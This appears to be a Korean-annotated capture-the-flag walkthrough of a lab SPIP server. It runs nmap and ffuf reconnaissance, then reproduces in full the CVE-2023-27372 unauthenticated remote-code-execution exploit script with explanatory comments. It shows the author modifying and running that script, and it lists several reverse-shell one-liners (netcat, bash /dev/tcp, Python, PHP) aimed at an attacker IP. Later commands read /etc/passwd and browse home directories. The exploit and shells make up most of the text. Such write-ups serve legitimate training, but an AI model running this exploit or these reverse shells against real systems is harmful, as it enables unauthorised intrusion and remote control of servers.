# 10.201.11.134

nmap -Pn -sV -sC -oN nmap.txt --open 10.201.11.134

┌──(root㉿docker-desktop)-[/]
└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.11.134
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 15:03 UTC
Nmap scan report for 10.201.11.134
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 7c:7e:2e:2c:f7:c0:c2:65:04:f4:3f:f4:f8:42:af:07 (RSA)
| 256 4b:6e:8e:ff:63:f4:bc:6b:8a:ec:65:97:0f:33:55:40 (ECDSA)
|\_ 256 a7:a3:b7:2f:64:4e:c9:38:10:44:69:58:e1:e8:85:aa (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
|\_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ffuf -u http://10.201.11.134 -H "Host:FUZZ.10.201.11.134" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.201.11.134 -H "Host:FUZZ.10.201.11.134" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.11.134
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
:: Header : Host: FUZZ.10.201.11.134
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 178

---

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|\_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

![](https://velog.velcdn.com/images/agnusdei1207/post/c9aee363-a145-4492-a058-9d1eabd973c6/image.png)

ffuf -u "http://10.201.11.134/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
┌──(root㉿docker-desktop)-[/]
└─# ffuf -u "http://10.201.11.134/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.11.134/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

images [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 334ms]
server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 419ms]
spip [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 330ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

![](https://velog.velcdn.com/images/agnusdei1207/post/1857c055-20e8-41ff-a8fa-0947585311cb/image.png)

images, server-status, spip

![](https://velog.velcdn.com/images/agnusdei1207/post/4b46f70a-95d5-4c12-8b5a-47b174ffecf3/image.png)

![](https://velog.velcdn.com/images/agnusdei1207/post/af9a94e6-090f-4696-9601-444fa18824f8/image.png)
http://10.201.11.134/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr

![](https://velog.velcdn.com/images/agnusdei1207/post/c85edd3d-63d7-4a14-8bc1-cc659a4e2aea/image.png)

- 4.2.0 unauthenticated vulnerable

https://github.com/advisories/GHSA-7w4r-xxr6-xrcj
https://github.com/PaulSec/SPIPScan?source=post_page-----a256af21d7bd---------------------------------------

> apt install exploitdb
> searchsploiot -u
> searchsploit spip

# 10.201.11.134

┌──(root㉿docker-desktop)-[/]
└─# searchsploit spip

---

Exploit Title | Path

---

SPIP - 'connect' PHP Injection (Metasploit) | php/remote/27941.rb
SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution | php/webapps/27172.txt
SPIP 1.8.2g - Remote Command Execution | php/webapps/1482.php
SPIP 1.8.3 - 'Spip_login.php' Remote File Inclusion | php/webapps/27589.txt
SPIP 1.8/1.9 - 'index.php3' Cross-Site Scripting | php/webapps/27158.txt
SPIP 1.8/1.9 - Multiple SQL Injections | php/webapps/27157.txt
SPIP 2.1 - 'var_login' Cross-Site Scripting | php/webapps/34388.txt
SPIP 2.x - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/37397.html
SPIP 3.1.1/3.1.2 - File Enumeration / Path Traversal | php/webapps/40596.txt
SPIP 3.1.2 - Cross-Site Request Forgery | php/webapps/40597.txt
SPIP 3.1.2 Template Compiler/Composer - PHP Code Execution | php/webapps/40595.txt
SPIP < 2.0.9 - Arbitrary Copy All Passwords to '.XML' File | php/webapps/9448.py
SPIP CMS < 2.0.23/ 2.1.22/3.0.9 - Privilege Escalation | php/webapps/33425.py
spip v4.1.10 - Spoofing Admin account | php/webapps/51557.txt
SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

---

# 4.2.0 RCE 취약점 발견

Shellcodes: No Results
Papers: No Results

![](https://velog.velcdn.com/images/agnusdei1207/post/35cf51f8-0267-4bba-8e49-4c8986663cfa/image.png)

SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

> cat /usr/share/exploitdb/exploits/php/webapps/51536.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 해당 내용 코드

# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
# Google Dork: inurl:"/spip.php?page=login"
# Date: 19/06/2023
# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)
# Vendor Homepage: https://www.spip.net/
# Software Link: https://files.spip.net/spip/archives/
# Version: < 4.2.1 (Except few fixed versions indicated in the description)
# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0
# CVE reference : CVE-2023-27372 (coiffeur)
# CVSS : 9.8 (Critical)
#
# Vulnerability Description:
#
# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
#
# Usage: python3 CVE-2023-27372.py http://example.com
import argparse # 명령줄 인자(command-line arguments)를 파싱하기 위해 argparse 모듈을 가져옴.
import bs4 # BeautifulSoup 4 (bs4) 모듈을 가져옴. HTML/XML 문서에서 데이터를 추출(스크래핑)하는 데 사용됨.
import html # HTML 엔티티를 처리하기 위해 html 모듈을 가져옴 (주로 인코딩/디코딩).
import requests # HTTP 요청을 보내기 위해 requests 라이브러리를 가져옴.

def parseArgs():
    # 명령줄 인자를 파싱하는 함수 정의.
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    # 스크립트 설명을 설정.
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    # 필수 인자: SPIP 애플리케이션의 기본 URL (Uniform Resource Locator)을 정의.
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    # 필수 인자: 서버에서 실행할 명령어를 정의.
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    # 선택적 인자: 상세 모드(verbose mode) 활성화 여부를 정의.
    return parser.parse_args() # 파싱된 인자들을 반환.

def get_anticsrf(url):
    # Cross-Site Request Forgery (CSRF) 방지 토큰(Anti-CSRF token)을 가져오는 함수 정의.
    # SPIP의 비밀번호 재설정 페이지('/spip.php?page=spip_pass')에 요청을 보냄.
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    # 응답 텍스트를 파싱하기 위해 BeautifulSoup 객체를 생성.
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    # HTML에서 이름이 'formulaire_action_args'인 <input> 태그를 찾음. 이 태그에 Anti-CSRF 토큰이 포함되어 있음.
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        # 태그를 찾았다면, 해당 태그의 'value' 속성에서 토큰 값을 추출.
        csrf_value = csrf_input['value']
        if options.verbose:
            # 상세 모드일 경우 토큰 값을 출력.
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value # 토큰 값을 반환.
    else:
        # 토큰을 찾지 못했을 경우 오류 메시지를 출력하고 -1을 반환.
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    # 공격 페이로드(payload)를 전송하는 함수 정의.
    data = {
        "page": "spip_pass", # POST 요청의 'page' 인자는 'spip_pass' (비밀번호 재설정 페이지).
        "formulaire_action": "oubli", # 'formulaire_action' 인자는 'oubli' (잊어버림) 액션을 트리거.
        "formulaire_action_args": csrf, # 앞에서 얻은 Anti-CSRF 토큰 값을 사용.
        "oubli": payload # 'oubli' 파라미터에 RCE를 위한 악성 페이로드를 전달.
    }
    # 공격 페이로드를 담은 POST 요청을 해당 URL로 전송.
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        # 상세 모드일 경우 전송된 페이로드를 출력.
        print("[+] Execute this payload : %s" % payload)
    return 0 # 함수 종료.

if __name__ == '__main__':
    # 스크립트가 직접 실행될 때 실행되는 메인 블록.
    options = parseArgs() # 명령줄 인자를 파싱하여 'options' 변수에 저장.

    # HTTPS 요청 시 발생하는 SSL/TLS 경고를 비활성화하는 설정.
    requests.packages.urllib3.disable_warnings()
    # SSL/TLS 암호화 스위트(cipher suite)를 조작하여 특정 환경에서 발생할 수 있는 연결 문제를 회피.
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        # pyOpenSSL을 사용하는 환경에서도 동일한 암호화 스위트 설정을 시도 (일관성 유지).
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass # pyOpenSSL 관련 속성이 없을 경우 무시.

    # get_anticsrf 함수를 호출하여 Anti-CSRF 토큰을 얻음.
    csrf = get_anticsrf(url=options.url)

    # 최종 페이로드를 생성하고 send_payload 함수를 호출하여 전송.
    # 페이로드 구조: s:길이:"PHP 코드";
    # s:20+len(options.command):"<?php system('사용자 입력 명령어'); ?>";
    # 이는 PHP의 직렬화(serialization) 포맷이며, 'oubli' 파라미터가 역직렬화될 때
    # 악의적인 객체나 코드를 주입하여 원격 코드 실행을 유발하는 Insecure Deserialization 공격 기법을 사용.
    # 'system()' 함수는 인자로 전달된 운영체제(Operating System, OS) 명령어를 실행.
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
```

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
python3: can't open file '/usr/share/exploitdb/exploits/php/webapps/51536': [Errno 2] No such file or directory

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
Traceback (most recent call last):
File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 63, in <module>
requests.packages.urllib3.util.ssl*.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'urllib3.util.ssl*' has no attribute 'DEFAULT_CIPHERS'

# 문제있는 코드 주석

──(root㉿docker-desktop)-[/]
└─# vim /usr/share/exploitdb/exploits/php/webapps/51536.py

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 66
except AttributeError:
^^^^^^
IndentationError: expected an indented block after 'try' statement on line 64

# 왜 못 찾지?

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
[-] Unable to find Anti-CSRF token

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id" --verbose
[-] Unable to find Anti-CSRF token
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# 직접 input 확인하자 -> 대상에 input 태그가 없네? -> 다른 페이지 찾기 -> 취약점 다시 보기 -> spip.php?page=login

──(root㉿docker-desktop)-[/]
└─# http http://10.201.11.134

# 탐색 -> 안 나옴

┌──(root㉿docker-desktop)-[/]
└─# http http://10.201.11.134/spip.php
HTTP/1.1 404 Not Found
Connection: Keep-Alive
Content-Length: 274
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 08 Nov 2025 09:41:21 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)

# 초반 ffuf -> /spip 로 가면? -> 결과가 안 보이므로 실패로 판단 -> 로그인 폼 찾기?

![](https://velog.velcdn.com/images/agnusdei1207/post/a9d0fb96-6adf-4e4e-91bb-cf0ea2ae1ad0/image.png)

──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip -c "id" --verbose
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";

┌──(root㉿docker-desktop)-[/]
└─# http http://10.201.11.134/spip.php?page=spip_pass
HTTP/1.1 404 Not Found
Connection: Keep-Alive
Content-Length: 274
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 08 Nov 2025 09:54:17 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.201.11.134 Port 80</address>
</body></html>

# i found it -> spip -> 한 번 더 써야함!

> http http://10.201.11.134/spip/spip.php?page=spip_pass

# input 에 oubli CSRF 토큰이 hidden 처리되어 있음

- AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx

![](https://velog.velcdn.com/images/agnusdei1207/post/2d8bdd5e-9cb6-4a62-941d-3ab620e247bc/image.png)

# not found token

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php?page=spip_pass -c "id" --verbose
[-] Unable to find Anti-CSRF token
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# without queryparam try!

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "id" --verbose
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# 코드가 실행은 됨 -> 페이로드에서는 전송만 할 뿐 print 하지는 않음 -> modify send_payload method in payload 51536.py

```python
def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload : %s" % payload)
        print(r.text) # 한줄 추가

    return 0
```

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "id" --verbose
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# result in input tag value

> SPIP 취약점 익스플로잇 결과가 <input> 태그의 value 속성에 들어가는 이유는,
> 해당 취약점이 비밀번호 재설정 폼의 이메일 입력값(oubli)을 PHP 코드로 처리하면서
> 명령 실행 결과를 그대로 value에 넣기 때문입니다.
> 즉, 악성 페이로드가 이메일 입력값으로 들어가고,
> 서버에서 system() 함수로 명령을 실행한 뒤
> 그 결과를 다시 이메일 입력값의 value로 반환합니다.

<input type="email" class="text email" autofocus="autofocus" required="required" name='oubli' id='oubli' value="s:22:"uid=33(www-data) gid=33(www-data) groups=33(www-data)

# RS

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose

- bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f
- nc -lvnp 1234

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose | grep input
<span class="form-hidden"><input name="page" value="spip_pass" type="hidden"
/><input name='formulaire_action' type='hidden'
                value='oubli' /><input name='formulaire_action_args' type='hidden'
                value='AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx' /><input name='formulaire_action_sign' type='hidden'

<input type="email" class="text email" autofocus="autofocus" required="required" name='oubli' id='oubli' value="s:103:"";" 아무것도 오지 않음 autocapitalize="off" autocorrect="off" />
<input type="text" class="text" name="nobot" id="nobot" value="" size="10" />

<p class="boutons"><input type="submit" class="btn submit" value="OK" /></p>

> hint 🔄 다른 역쉘 페이로드 시도 (Alternative Payloads)Netcat(nc) 명령이 대상 서버의 환경(버전, 설치 여부)에 따라 작동하지 않을 수 있습니다.문제점: 대상 서버에 $\text{Netcat}$ 대신 $\text{Bash}$, $\text{Python}$, 또는 $\text{PHP}$만 설치되어 있을 수 있습니다.해결책: 파이썬 스크립트의 -c 플래그에 다른 형태의 역쉘 명령어를 넣어 시도해 보세요

# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비

```sh
# python3
"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"

# bash
bash -i >& /dev/tcp/10.8.136.212/1234 0>&1

# php
"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
```

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/1234 0>&1" --verbose

# 작은따옴표로 문자열을 감싸서 명령 주입 오류를 피합니다.

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "php -r '$sock=fsockopen(\"10.8.136.212\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" --verbose

# RH ping test -> failed

tcpdump -i tun0 icmp
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ping -c 1 10.8.136.212" --verbose

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls" --verbose
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "pwd" --verbose

/home/think/spip/spip

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls /home" --verbose
think
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls /home/think" --verbose
spip
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /home/think/spip" --verbose

drwxr-xr-x 11 www-data www-data 4096 Feb 12 2024 .
drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 ..
-rwxr-xr-x 1 www-data www-data 7045 Dec 20 2023 CHANGELOG.md
drwxr-xr-x 3 www-data www-data 4096 Dec 20 2023 IMG
-rwxr-xr-x 1 www-data www-data 35147 Dec 20 2023 LICENSE
-rwxr-xr-x 1 www-data www-data 842 Dec 20 2023 README.md
-rwxr-xr-x 1 www-data www-data 178 Dec 20 2023 SECURITY.md
-rwxr-xr-x 1 www-data www-data 1761 Dec 20 2023 composer.json
-rwxr-xr-x 1 www-data www-data 27346 Dec 20 2023 composer.lock
drwxr-xr-x 3 www-data www-data 4096 Dec 20 2023 config
drwxr-xr-x 22 www-data www-data 4096 Dec 20 2023 ecrire
-rwxr-xr-x 1 www-data www-data 4307 Dec 20 2023 htaccess.txt
-rwxr-xr-x 1 www-data www-data 42 Dec 20 2023 index.php
drwxr-xr-x 5 www-data www-data 4096 Dec 20 2023 local
drwxr-xr-x 22 www-data www-data 4096 Dec 20 2023 plugins-dist
-rwxr-xr-x 1 www-data www-data 3645 Dec 20 2023 plugins-dist.json
drwxr-xr-x 12 www-data www-data 4096 Dec 20 2023 prive
-rwxr-xr-x 1 www-data www-data 973 Dec 20 2023 spip.php
-rwxr-xr-x 1 www-data www-data 1212 Dec 20 2023 spip.png
-rwxr-xr-x 1 www-data www-data 1673 Dec 20 2023 spip.svg
drwxr-xr-x 10 www-data www-data 4096 Dec 20 2023 squelettes-dist
drwxr-xr-x 6 www-data www-data 4096 Nov 9 04:37 tmp
drwxr-xr-x 6 www-data www-data 4096 Dec 20 2023 vendor

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /etc/passwd" --verbose

# think 1000번인걸로 보아 일반 사용자 계정으로 판단 -> 일반적으로 1000부터 시작함 일반 게스트는, 0-> root 관리자

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
think:x:1000:1000::/home/think:/bin/sh

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "id" --verbose

# 현재 www-data 계정

uid=33(www-data) gid=33(www-data) groups=33(www-data)

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /" --verbose

drwxr-xr-x 1 root root 4096 Dec 20 2023 .
drwxr-xr-x 1 root root 4096 Dec 20 2023 ..
-rwxr-xr-x 1 root root 0 Dec 20 2023 .dockerenv
lrwxrwxrwx 1 root root 7 Oct 3 2023 bin -> usr/bin
drwxr-xr-x 2 root root 4096 Apr 15 2020 boot
drwxr-xr-x 5 root root 340 Nov 9 04:36 dev
drwxr-xr-x 1 root root 4096 Dec 20 2023 etc
drwxr-xr-x 1 root root 4096 Dec 7 2023 home
lrwxrwxrwx 1 root root 7 Oct 3 2023 lib -> usr/lib
lrwxrwxrwx 1 root root 9 Oct 3 2023 lib32 -> usr/lib32
lrwxrwxrwx 1 root root 9 Oct 3 2023 lib64 -> usr/lib64
lrwxrwxrwx 1 root root 10 Oct 3 2023 libx32 -> usr/libx32
drwxr-xr-x 2 root root 4096 Oct 3 2023 media
drwxr-xr-x 2 root root 4096 Oct 3 2023 mnt
drwxr-xr-x 2 root root 4096 Oct 3 2023 opt
dr-xr-xr-x 172 root root 0 Nov 9 04:36 proc
drwx------ 2 root root 4096 Oct 3 2023 root
drwxr-xr-x 1 root root 4096 Dec 7 2023 run
lrwxrwxrwx 1 root root 8 Oct 3 2023 sbin -> usr/sbin
drwxr-xr-x 2 root root 4096 Oct 3 2023 srv
dr-xr-xr-x 13 root root 0 Nov 9 04:36 sys
drwxrwxrwt 1 root root 4096 Nov 9 04:41 tmp
drwxr-xr-x 1 root root 4096 Oct 3 2023 usr
drwxr-xr-x 1 root root 4096 Dec 7 2023 var

/var

drwxr-xr-x 1 root root 4096 Dec 7 2023 .
drwxr-xr-x 1 root root 4096 Dec 20 2023 ..
drwxr-xr-x 2 root root 4096 Apr 15 2020 backups
drwxr-xr-x 1 root root 4096 Dec 7 2023 cache
drwxr-xr-x 1 root root 4096 Dec 7 2023 lib
drwxrwsr-x 2 root staff 4096 Apr 15 2020 local
lrwxrwxrwx 1 root root 9 Oct 3 2023 lock -> /run/lock
drwxr-xr-x 1 root root 4096 Dec 7 2023 log
drwxrwsr-x 2 root mail 4096 Oct 3 2023 mail
drwxr-xr-x 2 root root 4096 Oct 3 2023 opt
lrwxrwxrwx 1 root root 4 Oct 3 2023 run -> /run
drwxr-xr-x 2 root root 4096 Oct 3 2023 spool
drwxrwxrwt 2 root root 4096 Oct 3 2023 tmp
drwxr-xr-x 3 root root 4096 Dec 7 2023 www

# RH python 2차 시도

python3 -m http.server 8000

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/8000 0>&1" --verbose

# 탐색

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /home/think" --verbose

drwxr-xr-x 8 think think 4096 Feb 10 2024 .
drwxr-xr-x 1 root root 4096 Dec 7 2023 ..
lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think 220 Nov 14 2023 .bash_logout
-rw-r--r-- 1 think think 3771 Nov 14 2023 .bashrc
drwx------ 2 think think 4096 Nov 14 2023 .cache
drwx------ 3 think think 4096 Dec 8 2023 .config
drwx------ 3 think think 4096 Feb 10 2024 .gnupg
drwxrwxr-x 3 think think 4096 Jan 10 2024 .local
-rw-r--r-- 1 think think 807 Nov 14 2023 .profile
lrwxrwxrwx 1 think think 9 Feb 10 2024 .python_history -> /dev/null
drwxr-xr-x 2 think think 4096 Jan 10 2024 .ssh
lrwxrwxrwx 1 think think 9 Feb 10 2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 spip
-rw-r--r-- 1 root root 35 Feb 10 2024 user.txt

# flag 1

